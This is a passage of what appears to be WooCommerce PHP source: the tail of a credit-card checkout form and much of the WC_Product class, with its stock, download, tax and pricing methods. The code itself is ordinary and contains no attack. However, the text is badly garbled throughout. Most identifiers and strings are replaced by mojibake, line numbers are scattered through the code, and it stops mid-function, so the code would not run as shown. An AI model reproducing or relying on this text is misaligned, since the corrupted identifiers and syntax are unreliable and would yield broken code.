="šput-‹xˆwc-üed™-ÿrd-fÜm-ÿrd-numb”" 
ty³
="‹xt" 
maxËngth
="20" 
autocom¶‘e
="off" 
¶aûhŞd”
="â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢" 
Çme
="' . ( $args['fields_have_names'] ? $this->id . '-card-number' : '' ) . '" />

240 </
p
>',

242 <
Ïb–
 ="' .ƒsc_©ŒĞ$this->id ) . '-ÿrd-expœy">' . __Ğ'
	`Expœy
 (
MM
/
YY
)', '
woocomm”û
' ) . ' <
¥ª
 
şass
="required">*</span></label>

243 <
šput
 
id
="' .ƒsc_©ŒĞ$this->id ) . '-ÿrd-expœy" 
şass
="šput-‹xˆwc-üed™-ÿrd-fÜm-ÿrd-expœy" 
ty³
="‹xt" 
autocom¶‘e
="off" 
¶aûhŞd”
="' . __Ğ'MM / YY', 'woocomm”û' ) . '" 
Çme
="' . ( $args['fields_have_names'] ? $this->id . '-card-expiry' : '' ) . '" />

244 </
p
>',

246 <
Ïb–
 ="' .ƒsc_©ŒĞ$this->id ) . '-ÿrd-cvc">' . __Ğ'
C¬d
 
Code
', '
woocomm”û
' ) . ' <
¥ª
 
şass
="required">*</span></label>

247 <
šput
 
id
="' .ƒsc_©ŒĞ$this->id ) . '-ÿrd-cvc" 
şass
="šput-‹xˆwc-üed™-ÿrd-fÜm-ÿrd-cvc" 
ty³
="‹xt" 
autocom¶‘e
="off" 
¶aûhŞd”
="' . __Ğ'CVC', 'woocomm”û' ) . '" 
Çme
="' . ( $args['fields_have_names'] ? $this->id . '-card-cvc' : '' ) . '" />

248 </
p
>'

251 
$f›lds
 = 
	`wp_·r£_¬gs
Ğ$f›lds, 
	`­¶y_f‹rs
Ğ'woocomm”û_üed™_ÿrd_fÜm_f›lds', 
$deçuÉ_f›lds
, 
$this
->
id
 ) );

253 <
f›ld£t
 
id
="<?phpƒcho $this->id; ?>-cc-form">

254 <?
php
 
	`do_aùiÚ
Ğ'woocomm”û_üed™_ÿrd_fÜm_¡¬t', 
$this
->
id
 ); ?>

255 <?
php


256 
	`fÜ—ch
 ( 
$f›lds
 
as
 
$f›ld
 ) {

257 
echo
 
$f›ld
;

260 <?
php
 
	`do_aùiÚ
Ğ'woocomm”û_üed™_ÿrd_fÜm_’d', 
$this
->
id
 ); ?>

261 <
div
 
şass
="clear"></div>

262 </
f›ld£t
>

263 <?
php


264 
	}
}

	@includes/abstracts/abstract-wc-product.php

1 <?
php


13 şas 
	cWC_Produù
 {

16 
public
 
	m$id
;

19 
public
 
	m$po¡
;

22 
public
 
	m$´oduù_ty³
 = 
nuÎ
;

30 
public
 
funùiÚ
 
	$__cÚ¡ruù
Ğ
$´oduù
 ) {

31 iàĞ
	`is_num”ic
Ğ
$´oduù
 ) ) {

32 
$this
->
id
 = 
	`absšt
Ğ
$´oduù
 );

33 
$this
->
po¡
 = 
	`g‘_po¡
Ğ$this->
id
 );

34 } 
	`–£if
 ( 
$´oduù
 
š¡ªûof
 
WC_Produù
 ) {

35 
$this
->
id
 = 
	`absšt
Ğ
$´oduù
->id );

36 
$this
->
po¡
 = 
$´oduù
;

37 } 
	`–£if
 ( 
$´oduù
 
š¡ªûof
 
WP_Po¡
 || 
	`is£t
Ğ$´oduù->
ID
 ) ) {

38 
$this
->
id
 = 
	`absšt
Ğ
$´oduù
->
ID
 );

39 
$this
->
po¡
 = 
$´oduù
;

50 
public
 
funùiÚ
 
	$__is£t
Ğ
$key
 ) {

51  
	`m‘ad©a_exi¡s
Ğ'po¡', 
$this
->
id
, '_' . 
$key
 );

52 
	}
}

61 
public
 
funùiÚ
 
	$__g‘
Ğ
$key
 ) {

64 iàĞ
	`š_¬¿y
Ğ
$key
, 
	`¬¿y
( 'downloadable', 'virtual', 'backorders', 'manage_stock', 'featured', 'sold_individually' ) ) ) {

65 
$v®ue
 = ( $v®uğ
	`g‘_po¡_m‘a
Ğ
$this
->
id
, '_' . 
$key
, 
Œue
 ) ) ? $value : 'no';

67 } 
	`–£if
 ( 
	`š_¬¿y
Ğ
$key
, 
	`¬¿y
( 'product_attributes', 'crosssell_ids', 'upsell_ids' ) ) ) {

68 
$v®ue
 = ( $v®uğ
	`g‘_po¡_m‘a
Ğ
$this
->
id
, '_' . 
$key
, 
Œue
 ) ) ? $v®u: 
	`¬¿y
();

70 } 
	`–£if
 ( 'visib™y' =ğ
$key
 ) {

71 
$v®ue
 = ( $v®uğ
	`g‘_po¡_m‘a
Ğ
$this
->
id
, '_visib™y', 
Œue
 ) ) ? $value : 'hidden';

73 } 
	`–£if
 ( '¡ock' =ğ
$key
 ) {

74 
$v®ue
 = ( $v®uğ
	`g‘_po¡_m‘a
Ğ
$this
->
id
, '_¡ock', 
Œue
 ) ) ? $value : 0;

76 } 
	`–£if
 ( '¡ock_¡©us' =ğ
$key
 ) {

77 
$v®ue
 = ( $v®uğ
	`g‘_po¡_m‘a
Ğ
$this
->
id
, '_¡ock_¡©us', 
Œue
 ) ) ? $value : 'instock';

79 } 
	`–£if
 ( 'x_¡©us' =ğ
$key
 ) {

80 
$v®ue
 = ( $v®uğ
	`g‘_po¡_m‘a
Ğ
$this
->
id
, '_x_¡©us', 
Œue
 ) ) ? $value : 'taxable';

83 
$v®ue
 = 
	`g‘_po¡_m‘a
Ğ
$this
->
id
, '_' . 
$key
, 
Œue
 );

86  
$v®ue
;

87 
	}
}

95 
public
 
funùiÚ
 
	$g‘_po¡_d©a
() {

96  
$this
->
po¡
;

97 
	}
}

105 
public
 
funùiÚ
 
	$g‘_g®Ëry_©chm’t_ids
() {

106 iàĞ! 
	`is£t
Ğ
$this
->
´oduù_image_g®Ëry
 ) ) {

108 
$©chm’t_ids
 = 
	`g‘_po¡s
Ğ'po¡_·»Á=' . 
$this
->
id
 . '&numberposts=-1&post_type=attachment&orderby=menu_order&order=ASC&post_mime_type=image&fields=ids&meta_key=_woocommerce_exclude_image&meta_value=0' );

109 
$©chm’t_ids
 = 
	`¬¿y_diff
Ğ$©chm’t_ids, 
	`¬¿y
Ğ
	`g‘_po¡_thumbÇ_id
() ) );

110 
$this
->
´oduù_image_g®Ëry
 = 
	`im¶ode
Ğ',', 
$©chm’t_ids
 );

112  
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_g®Ëry_©chm’t_ids', 
	`¬¿y_f‹r
Ğ(
¬¿y
è
	`ex¶ode
Ğ',', 
$this
->
´oduù_image_g®Ëry
 ) ), $this );

113 
	}
}

119 
public
 
funùiÚ
 
	$g‘_³rm®šk
() {

120  
	`g‘_³rm®šk
Ğ
$this
->
id
 );

121 
	}
}

128 
public
 
funùiÚ
 
	$g‘_sku
() {

129  
$this
->
sku
;

130 
	}
}

138 
public
 
funùiÚ
 
	$g‘_¡ock_quªt™y
() {

139  
$this
->
	`mªagšg_¡ock
(è? 
	`­¶y_f‹rs
Ğ'woocomm”û_¡ock_amouÁ', $this->
¡ock
 ) : '';

140 
	}
}

148 
public
 
funùiÚ
 
	$g‘_tÙ®_¡ock
() {

149  
$this
->
	`g‘_¡ock_quªt™y
();

150 
	}
}

158 
public
 
funùiÚ
 
	$£t_¡ock
Ğ
$amouÁ
 = 
nuÎ
 ) {

159 iàĞ
	`is_nuÎ
Ğ
$amouÁ
 ) ) {

163 iàĞ
$this
->
	`mªagšg_¡ock
() ) {

166 
$this
->
¡ock
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_¡ock_amouÁ', 
$amouÁ
 );

169 
	`upd©e_po¡_m‘a
Ğ
$this
->
id
, '_¡ock', $this->
¡ock
 );

172 iàĞ! 
$this
->
	`backÜd”s_®lowed
(è&& $this->
	`g‘_tÙ®_¡ock
(è<ğ
	`g‘_İtiÚ
( 'woocommerce_notify_no_stock_amount' ) ) {

173 
$this
->
	`£t_¡ock_¡©us
( 'outofstock' );

175 } 
	`–£if
 ( 
$this
->
	`backÜd”s_®lowed
(è|| $this->
	`g‘_tÙ®_¡ock
(è> 
	`g‘_İtiÚ
( 'woocommerce_notify_no_stock_amount' ) ) {

176 
$this
->
	`£t_¡ock_¡©us
( 'instock' );

180 
	`d–‘e_Œªs›Á
Ğ'wc_´oduù_tÙ®_¡ock_' . 
$this
->
id
 );

183 
	`do_aùiÚ
Ğ'woocomm”û_´oduù_£t_¡ock', 
$this
 );

185  
$this
->
	`g‘_¡ock_quªt™y
();

189 
	}
}

197 
public
 
funùiÚ
 
	$»duû_¡ock
Ğ
$by
 = 1 ) {

198  
$this
->
	`£t_¡ock
Ğ$this->
¡ock
 - 
$by
 );

199 
	}
}

207 
public
 
funùiÚ
 
	$šü—£_¡ock
Ğ
$by
 = 1 ) {

208  
$this
->
	`£t_¡ock
Ğ$this->
¡ock
 + 
$by
 );

209 
	}
}

217 
public
 
funùiÚ
 
	$£t_¡ock_¡©us
Ğ
$¡©us
 ) {

218 
$¡©us
 = ( 'outofstock' === $status ) ? 'outofstock' : 'instock';

220 iàĞ
	`upd©e_po¡_m‘a
Ğ
$this
->
id
, '_¡ock_¡©us', 
$¡©us
 ) ) {

221 
	`do_aùiÚ
Ğ'woocomm”û_´oduù_£t_¡ock_¡©us', 
$this
->
id
, 
$¡©us
 );

223 
	}
}

234 
public
 
funùiÚ
 
	$is_ty³
Ğ
$ty³
 ) {

235  ( 
$this
->
´oduù_ty³
 =ğ
$ty³
 || ( 
	`is_¬¿y
Ğ$ty³ ) && 
	`š_¬¿y
Ğ$this->´oduù_ty³, $ty³ ) ) ) ? 
Œue
 : 
çl£
;

236 
	}
}

244 
public
 
funùiÚ
 
	$is_dowÆßdabË
() {

245  
$this
->
dowÆßdabË
 =ğ'yes' ? 
Œue
 : 
çl£
;

246 
	}
}

257 
public
 
funùiÚ
 
has_fe
Ğ
$dowÆßd_id
 = '' ) {

258  ( 
$this
->
is_dowÆßdabË
(è&& $this->
g‘_fe
Ğ
$dowÆßd_id
 ) ) ? 
Œue
 : 
çl£
;

268 
public
 
funùiÚ
 
	$g‘_fes
() {

269 
$dowÆßdabË_fes
 = 
	`¬¿y_f‹r
Ğ
	`is£t
Ğ
$this
->
dowÆßdabË_fes
 ) ? (
¬¿y
è
	`maybe_un£rŸlize
Ğ$this->dowÆßdabË_fe è: 
	`¬¿y
() );

271 iàĞ
$dowÆßdabË_fes
 ) {

272 
	`fÜ—ch
 ( 
$dowÆßdabË_fes
 
as
 
$key
 => 
$fe
 ) {

273 iàĞ! 
	`is_¬¿y
Ğ
$fe
 ) ) {

274 
$dowÆßdabË_fes
[ 
$key
 ] = 
	`¬¿y
(

275 'fe' => 
$fe
,

281 iàĞ
	`em±y
Ğ
$fe
['name'] ) ) {

282 
$dowÆßdabË_fes
[ 
$key
 ]['Çme'] = 
	`wc_g‘_f’ame_äom_u¾
Ğ
$fe
['file'] );

286 
$dowÆßdabË_fes
[ 
$key
 ]['fe'] = 
	`­¶y_f‹rs
Ğ'woocomm”û_fe_dowÆßd_·th', $dowÆßdabË_fes[ $key ]['fe'], 
$this
, $key );

290  
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_fes', 
$dowÆßdabË_fes
, 
$this
 );

291 
	}
}

299 
public
 
funùiÚ
 
g‘_fe
Ğ
$dowÆßd_id
 = '' ) {

300 
$fes
 = 
$this
->
g‘_fes
();

302 iàĞ'' ==ğ
$dowÆßd_id
 ) {

303 
$fe
 = Ğ
$fes
 ) ? 
cu¼’t
Ğ$fe è: 
çl£
;

304 } 
–£if
 ( 
is£t
Ğ
$fes
[ 
$dowÆßd_id
 ] ) ) {

305 
	g$fe
 = 
$fes
[ 
$dowÆßd_id
 ];

307 
	g$fe
 = 
çl£
;

311  
­¶y_f‹rs
Ğ'woocomm”û_´oduù_fe', 
$fe
, 
$this
, 
$dowÆßd_id
 );

320 
public
 
funùiÚ
 
	$g‘_fe_dowÆßd_·th
Ğ
$dowÆßd_id
 ) {

321 
$fes
 = 
$this
->
	`g‘_fes
();

323 iàĞ
	`is£t
Ğ
$fes
[ 
$dowÆßd_id
 ] ) ) {

324 
$fe_·th
 = 
$fes
[ 
$dowÆßd_id
 ]['file'];

326 
$fe_·th
 = '';

330  
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_fe_dowÆßd_·th', 
$fe_·th
, 
$this
, 
$dowÆßd_id
 );

331 
	}
}

339 
public
 
funùiÚ
 
	$is_vœtu®
() {

340  
$this
->
vœtu®
 =ğ'yes' ? 
Œue
 : 
çl£
;

341 
	}
}

349 
public
 
funùiÚ
 
	$Ãeds_shpšg
() {

350  
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_Ãeds_shpšg', 
$this
->
	`is_vœtu®
(è? 
çl£
 : 
Œue
, $this );

351 
	}
}

359 
public
 
funùiÚ
 
	$is_sŞd_šdividu®ly
() {

360 
$»tuº
 = 
çl£
;

362 iàĞ'yes' =ğ
$this
->
sŞd_šdividu®ly
 || ( ! $this->
	`backÜd”s_®lowed
(è&& $this->
	`g‘_¡ock_quªt™y
() == 1 ) ) {

363 
$»tuº
 = 
Œue
;

366  
	`­¶y_f‹rs
Ğ'woocomm”û_is_sŞd_šdividu®ly', 
$»tuº
, 
$this
 );

367 
	}
}

375 
public
 
funùiÚ
 
	$g‘_chd»n
() {

376  
	`¬¿y
();

377 
	}
}

385 
public
 
funùiÚ
 
	$has_chd
() {

386  
çl£
;

387 
	}
}

395 
public
 
funùiÚ
 
	$exi¡s
() {

396  
	`em±y
Ğ
$this
->
po¡
 ) ? 
çl£
 : 
Œue
;

397 
	}
}

405 
public
 
funùiÚ
 
	$is_xabË
() {

406 
$xabË
 = 
$this
->
x_¡©us
 =ğ'xabË' && 
	`g‘_İtiÚ
Ğ'woocomm”û_ÿlc_xes' ) =ğ'yes' ? 
Œue
 : 
çl£
;

407  
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_is_xabË', 
$xabË
, 
$this
 );

408 
	}
}

416 
public
 
funùiÚ
 
	$is_shpšg_xabË
() {

417  
$this
->
x_¡©us
=='xabË' || $this->x_¡©us=='shpšg' ? 
Œue
 : 
çl£
;

418 
	}
}

426 
public
 
funùiÚ
 
	$g‘_t™Ë
() {

427  
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_t™Ë', 
$this
->
po¡
->
po¡_t™Ë
, $this );

428 
	}
}

436 
public
 
funùiÚ
 
	$g‘_·»Á
() {

437  
	`­¶y_f‹rs
('woocomm”û_´oduù_·»Á', 
$this
->
po¡
->
po¡_·»Á
, $this);

438 
	}
}

446 
public
 
funùiÚ
 
	$add_to_ÿ¹_u¾
() {

447  
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_add_to_ÿ¹_u¾', 
	`g‘_³rm®šk
Ğ
$this
->
id
 ), $this );

448 
	}
}

456 
public
 
funùiÚ
 
	$sšgË_add_to_ÿ¹_‹xt
() {

457  
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_sšgË_add_to_ÿ¹_‹xt', 
	`__
Ğ'AddØÿ¹', 'woocomm”û' ), 
$this
 );

458 
	}
}

466 
public
 
funùiÚ
 
	$add_to_ÿ¹_‹xt
() {

467  
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_add_to_ÿ¹_‹xt', 
	`__
Ğ'R—d mÜe', 'woocomm”û' ), 
$this
 );

468 
	}
}

476 
public
 
funùiÚ
 
	$mªagšg_¡ock
() {

477  ( ! 
	`is£t
Ğ
$this
->
mªage_¡ock
 ) || $this->mªage_¡ock =ğ'no' || 
	`g‘_İtiÚ
Ğ'woocomm”û_mªage_¡ock' ) !=ğ'yes' ) ? 
çl£
 : 
Œue
;

478 
	}
}

486 
public
 
funùiÚ
 
	$is_š_¡ock
() {

487 iàĞ
$this
->
	`mªagšg_¡ock
() ) {

489 iàĞ
$this
->
	`backÜd”s_®lowed
() ) {

490  
Œue
;

492 iàĞ
$this
->
	`g‘_tÙ®_¡ock
(è<ğ
	`g‘_İtiÚ
( 'woocommerce_notify_no_stock_amount' ) ) {

493  
çl£
;

495 iàĞ
$this
->
¡ock_¡©us
 === 'instock' ) {

496  
Œue
;

498  
çl£
;

505 iàĞ
$this
->
¡ock_¡©us
 === 'instock' ) {

506  
Œue
;

508  
çl£
;

512 
	}
}

520 
public
 
funùiÚ
 
	$backÜd”s_®lowed
() {

521  
$this
->
backÜd”s
 ==ğ'yes' || $this->backÜd” ==ğ'nÙify' ? 
Œue
 : 
çl£
;

522 
	}
}

530 
public
 
funùiÚ
 
	$backÜd”s_»quœe_nÙifiÿtiÚ
() {

531  
$this
->
	`mªagšg_¡ock
(è&& $this->
backÜd”s
 ==ğ'nÙify' ? 
Œue
 : 
çl£
;

532 
	}
}

541 
public
 
funùiÚ
 
	$is_Ú_backÜd”
Ğ
$qty_š_ÿ¹
 = 0 ) {

542  
$this
->
	`mªagšg_¡ock
(è&& $this->
	`backÜd”s_®lowed
(è&& ( $this->
	`g‘_tÙ®_¡ock
(è- 
$qty_š_ÿ¹
 ) < 0 ? 
Œue
 : 
çl£
;

543 
	}
}

552 
public
 
funùiÚ
 
	$has_’ough_¡ock
Ğ
$quªt™y
 ) {

553  ! 
$this
->
	`mªagšg_¡ock
(è|| $this->
	`backÜd”s_®lowed
(è|| $this->
¡ock
 >ğ
$quªt™y
 ? 
Œue
 : 
çl£
;

554 
	}
}

562 
public
 
funùiÚ
 
	$g‘_avaab™y
() {

564 
$avaab™y
 = 
$şass
 = "";

566 iàĞ
$this
->
	`mªagšg_¡ock
() ) {

567 iàĞ
$this
->
	`is_š_¡ock
() ) {

569 iàĞ
$this
->
	`g‘_tÙ®_¡ock
(è> 
	`g‘_İtiÚ
( 'woocommerce_notify_no_stock_amount' ) ) {

571 
$fÜm©_İtiÚ
 = 
	`g‘_İtiÚ
( 'woocommerce_stock_format' );

573  
$fÜm©_İtiÚ
 ) {

575 
$fÜm©
 = 
	`__
( 'In stock', 'woocommerce' );

578 
$low_amouÁ
 = 
	`g‘_İtiÚ
( 'woocommerce_notify_low_stock_amount' );

580 
$fÜm©
 = ( 
$this
->
	`g‘_tÙ®_¡ock
(è<ğ
$low_amouÁ
 ) ? 
	`__
( 'Only %s†eft in stock', 'woocommerce' ) : __( 'In stock', 'woocommerce' );

583 
$fÜm©
 = 
	`__
( '%s in stock', 'woocommerce' );

587 
$avaab™y
 = 
	`¥rštf
Ğ
$fÜm©
, 
$this
->
¡ock
 );

589 iàĞ
$this
->
	`backÜd”s_®lowed
(è&& $this->
	`backÜd”s_»quœe_nÙifiÿtiÚ
() ) {

590 
$avaab™y
 .ğ' ' . 
	`__
( '(backorders‡llowed)', 'woocommerce' );

595 iàĞ
$this
->
	`backÜd”s_®lowed
() ) {

596 iàĞ
$this
->
	`backÜd”s_»quœe_nÙifiÿtiÚ
() ) {

597 
$avaab™y
 = 
	`__
( 'Available on backorder', 'woocommerce' );

598 
$şass
 = 'available-on-backorder';

600 
$avaab™y
 = 
	`__
( 'In stock', 'woocommerce' );

603 
$avaab™y
 = 
	`__
( 'Out of stock', 'woocommerce' );

604 
$şass
 = 'out-of-stock';

609 } 
	`–£if
 ( 
$this
->
	`backÜd”s_®lowed
() ) {

610 
$avaab™y
 = 
	`__
( 'Available on backorder', 'woocommerce' );

611 
$şass
 = 'available-on-backorder';

613 
$avaab™y
 = 
	`__
( 'Out of stock', 'woocommerce' );

614 
$şass
 = 'out-of-stock';

616 } 
	`–£if
 ( ! 
$this
->
	`is_š_¡ock
() ) {

617 
$avaab™y
 = 
	`__
( 'Out of stock', 'woocommerce' );

618 
$şass
 = 'out-of-stock';

621  
	`­¶y_f‹rs
Ğ'woocomm”û_g‘_avaab™y', 
	`¬¿y
Ğ'avaab™y' => 
$avaab™y
, 'şass' => 
$şass
 ), 
$this
 );

622 
	}
}

630 
public
 
funùiÚ
 
	$is_ã©u»d
() {

631  
$this
->
ã©u»d
 ==ğ'yes' ? 
Œue
 : 
çl£
;

632 
	}
}

640 
public
 
funùiÚ
 
	$is_visibË
() {

642 
$visibË
 = 
Œue
;

645 iàĞ
	`g‘_İtiÚ
Ğ'woocomm”û_hide_out_of_¡ock_™ems' ) ==ğ'yes' && ! 
$this
->
	`is_š_¡ock
() ) {

646 
$visibË
 = 
çl£
;

649 } 
	`–£if
 ( 
$this
->
visib™y
 === 'hidden' ) {

650 
$visibË
 = 
çl£
;

651 } 
	`–£if
 ( 
$this
->
visib™y
 === 'visible' ) {

652 
$visibË
 = 
Œue
;

655 } 
	`–£if
 ( 
$this
->
visib™y
 ==ğ'£¬ch' && 
	`is_£¬ch
() ) {

656 
$visibË
 = 
Œue
;

657 } 
	`–£if
 ( 
$this
->
visib™y
 ==ğ'£¬ch' && ! 
	`is_£¬ch
() ) {

658 
$visibË
 = 
çl£
;

659 } 
	`–£if
 ( 
$this
->
visib™y
 ==ğ'ÿlog' && 
	`is_£¬ch
() ) {

660 
$visibË
 = 
çl£
;

661 } 
	`–£if
 ( 
$this
->
visib™y
 ==ğ'ÿlog' && ! 
	`is_£¬ch
() ) {

662 
$visibË
 = 
Œue
;

665  
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_is_visibË', 
$visibË
, 
$this
->
id
 );

666 
	}
}

674 
public
 
funùiÚ
 
	$is_Ú_§Ë
() {

675  ( 
$this
->
	`g‘_§Ë_´iû
(è!ğ$this->
	`g‘_»guÏr_´iû
(è&& $this->g‘_§Ë_´iû(è=ğ$this->
	`g‘_´iû
() );

676 
	}
}

684 
public
 
funùiÚ
 
	$g‘_weight
() {

685  ( 
$this
->
weight
 ) ? $this->weight : '';

686 
	}
}

694 
public
 
funùiÚ
 
	$is_purcha§bË
() {

696 
$purcha§bË
 = 
Œue
;

699 iàĞ! 
$this
->
	`exi¡s
() ) {

700 
$purcha§bË
 = 
çl£
;

703 } 
	`–£if
 ( 
$this
->
	`g‘_´iû
() === '' ) {

704 
$purcha§bË
 = 
çl£
;

707 } 
	`–£if
 ( 
$this
->
po¡
->
po¡_¡©us
 !=ğ'publish' && ! 
	`cu¼’t_u£r_ÿn
Ğ'ed™_po¡', $this->
id
 ) ) {

708 
$purcha§bË
 = 
çl£
;

711  
	`­¶y_f‹rs
Ğ'woocomm”û_is_purcha§bË', 
$purcha§bË
, 
$this
 );

712 
	}
}

721 
public
 
funùiÚ
 
	$£t_´iû
Ğ
$´iû
 ) {

722 
$this
->
´iû
 = 
$´iû
;

723 
	}
}

732 
public
 
funùiÚ
 
	$adju¡_´iû
Ğ
$´iû
 ) {

733 
$this
->
´iû
 = $this->´iû + 
$´iû
;

734 
	}
}

741 
public
 
funùiÚ
 
	$g‘_§Ë_´iû
() {

742  
	`­¶y_f‹rs
Ğ'woocomm”û_g‘_§Ë_´iû', 
$this
->
§Ë_´iû
, $this );

743 
	}
}

750 
public
 
funùiÚ
 
	$g‘_»guÏr_´iû
() {

751  
	`­¶y_f‹rs
Ğ'woocomm”û_g‘_»guÏr_´iû', 
$this
->
»guÏr_´iû
, $this );

752 
	}
}

759 
public
 
funùiÚ
 
	$g‘_´iû
() {

760  
	`­¶y_f‹rs
Ğ'woocomm”û_g‘_´iû', 
$this
->
´iû
, $this );

761 
	}
}

770 
public
 
funùiÚ
 
g‘_´iû_šşudšg_x
Ğ
$qty
 = 1, 
$´iû
 = '' ) {

771 
$_x
 = 
Ãw
 
WC_Tax
();

773 iàĞ! 
	g$´iû
 ) {

774 
	g$´iû
 = 
$this
->
g‘_´iû
();

777 iàĞ
	g$this
->
is_xabË
() ) {

779 iàĞ
g‘_İtiÚ
('woocommerce_prices_include_tax') === 'no' ) {

781 
$x_¿‹s
 = 
$_x
->
g‘_¿‹s
Ğ
$this
->
g‘_x_şass
() );

782 
	g$xes
 = 
$_x
->
ÿlc_x
Ğ
$´iû
 * 
$qty
, 
$x_¿‹s
, 
çl£
 );

783 
	g$x_amouÁ
 = 
$_x
->
g‘_x_tÙ®
Ğ
$xes
 );

784 
	g$´iû
 = 
round
Ğ
$´iû
 * 
$qty
 + 
$x_amouÁ
, 
absšt
Ğ
g‘_İtiÚ
( 'woocommerce_price_num_decimals' ) ) );

788 
	g$x_¿‹s
 = 
$_x
->
g‘_¿‹s
Ğ
$this
->
g‘_x_şass
() );

789 
	g$ba£_x_¿‹s
 = 
$_x
->
g‘_shİ_ba£_¿‹
Ğ
$this
->
x_şass
 );

791 iàĞ! 
em±y
Ğ
WC
()->
cu¡om”
 ) && WC()->
	gcu¡om”
->
is_v©_exem±
() ) {

793 
	g$ba£_xes
 = 
$_x
->
ÿlc_x
Ğ
$´iû
 * 
$qty
, 
$ba£_x_¿‹s
, 
Œue
 );

794 
	g$ba£_x_amouÁ
 = 
¬¿y_sum
Ğ
$ba£_xes
 );

795 
	g$´iû
 = 
round
Ğ
$´iû
 * 
$qty
 - 
$ba£_x_amouÁ
, 
absšt
Ğ
g‘_İtiÚ
( 'woocommerce_price_num_decimals' ) ) );

797 } 
–£if
 ( 
$x_¿‹s
 !=ğ
$ba£_x_¿‹s
 ) {

799 
$ba£_xes
 = 
$_x
->
ÿlc_x
Ğ
$´iû
 * 
$qty
, 
$ba£_x_¿‹s
, 
Œue
 );

800 
	g$modded_xes
 = 
$_x
->
ÿlc_x
ĞĞ
$´iû
 * 
$qty
 ) - 
¬¿y_sum
Ğ
$ba£_xes
 ), 
$x_¿‹s
, 
çl£
 );

801 
	g$´iû
 = 
round
ĞĞ
$´iû
 * 
$qty
 ) - 
¬¿y_sum
Ğ
$ba£_xes
 ) +‡¼ay_sumĞ
$modded_xes
 ), 
absšt
Ğ
g‘_İtiÚ
( 'woocommerce_price_num_decimals' ) ) );

805 
	g$´iû
 = 
$´iû
 * 
$qty
;

812 
	g$´iû
 = 
$´iû
 * 
$qty
;

815  
­¶y_f‹rs
Ğ'woocomm”û_g‘_´iû_šşudšg_x', 
$´iû
, 
$qty
, 
$this
 );

826 
public
 
funùiÚ
 
g‘_´iû_exşudšg_x
Ğ
$qty
 = 1, 
$´iû
 = '' ) {

828 iàĞ! 
$´iû
 ) {

829 
$´iû
 = 
$this
->
g‘_´iû
();

832 iàĞ
	g$this
->
is_xabË
(è&& 
g‘_İtiÚ
('woocommerce_prices_include_tax') === 'yes' ) {

834 
$_x
 = 
Ãw
 
WC_Tax
();

835 
	g$x_¿‹s
 = 
$_x
->
g‘_shİ_ba£_¿‹
Ğ
$this
->
x_şass
 );

836 
	g$xes
 = 
$_x
->
ÿlc_x
Ğ
$´iû
 * 
$qty
, 
$x_¿‹s
, 
Œue
 );

837 
	g$´iû
 = 
$_x
->
round
Ğ
$´iû
 * 
$qty
 - 
¬¿y_sum
Ğ
$xes
 ) );

840 
	g$´iû
 = 
$´iû
 * 
$qty
;

843  
­¶y_f‹rs
Ğ'woocomm”û_g‘_´iû_exşudšg_x', 
$´iû
, 
$qty
, 
$this
 );

850 
public
 
funùiÚ
 
	$g‘_´iû_suffix
() {

851 
$´iû_di¥Ïy_suffix
 = 
	`g‘_İtiÚ
( 'woocommerce_price_display_suffix' );

853 iàĞ
$´iû_di¥Ïy_suffix
 ) {

854 
$´iû_di¥Ïy_suffix
 = ' <small class="woocommerce-price-suffix">' . $price_display_suffix . '</small>';

856 
$fšd
 = 
	`¬¿y
(

861 
$»¶aû
 = 
	`¬¿y
(

862 
	`wc_´iû
Ğ
$this
->
	`g‘_´iû_šşudšg_x
() ),

863 
	`wc_´iû
Ğ
$this
->
	`g‘_´iû_exşudšg_x
() )

866 
$´iû_di¥Ïy_suffix
 = 
	`¡r_»¶aû
Ğ
$fšd
, 
$»¶aû
, $price_display_suffix );

869  
	`­¶y_f‹rs
Ğ'woocomm”û_g‘_´iû_suffix', 
$´iû_di¥Ïy_suffix
, 
$this
 );

870 
	}
}

879 
public
 
funùiÚ
 
g‘_´iû_html
Ğ
$´iû
 = '' ) {

881 
$x_di¥Ïy_mode
 = 
g‘_İtiÚ
( 'woocommerce_tax_display_shop' );

882 
	g$di¥Ïy_´iû
 = 
$x_di¥Ïy_mode
 =ğ'šş' ? 
$this
->
g‘_´iû_šşudšg_x
(è: $this->
g‘_´iû_exşudšg_x
();

883 
	g$di¥Ïy_»guÏr_´iû
 = 
$x_di¥Ïy_mode
 =ğ'šş' ? 
$this
->
g‘_´iû_šşudšg_x
Ğ1, $this->
g‘_»guÏr_´iû
(èè: $this->
g‘_´iû_exşudšg_x
( 1, $this->get_regular_price() );

884 
	g$di¥Ïy_§Ë_´iû
 = 
$x_di¥Ïy_mode
 =ğ'šş' ? 
$this
->
g‘_´iû_šşudšg_x
Ğ1, $this->
g‘_§Ë_´iû
(èè: $this->
g‘_´iû_exşudšg_x
( 1, $this->get_sale_price() );

886 iàĞ
	g$this
->
g‘_´iû
() > 0 ) {

888 iàĞ
	g$this
->
is_Ú_§Ë
(è&& $this->
g‘_»guÏr_´iû
() ) {

890 
	g$´iû
 .ğ
$this
->
g‘_´iû_html_äom_to
Ğ
$di¥Ïy_»guÏr_´iû
, 
$di¥Ïy_´iû
 ) . 
	g$this
->
g‘_´iû_suffix
();

892 
	g$´iû
 = 
­¶y_f‹rs
Ğ'woocomm”û_§Ë_´iû_html', 
$´iû
, 
$this
 );

896 
	g$´iû
 .ğ
wc_´iû
Ğ
$di¥Ïy_´iû
 ) . 
$this
->
g‘_´iû_suffix
();

898 
	g$´iû
 = 
­¶y_f‹rs
Ğ'woocomm”û_´iû_html', 
$´iû
, 
$this
 );

902 } 
–£if
 ( 
$this
->
g‘_´iû
() === '' ) {

904 
$´iû
 = 
­¶y_f‹rs
Ğ'woocomm”û_em±y_´iû_html', '', 
$this
 );

906 } 
–£if
 ( 
$this
->
g‘_´iû
() == 0 ) {

908 iàĞ
$this
->
is_Ú_§Ë
(è&& $this->
g‘_»guÏr_´iû
() ) {

910 
$´iû
 .ğ
$this
->
g‘_´iû_html_äom_to
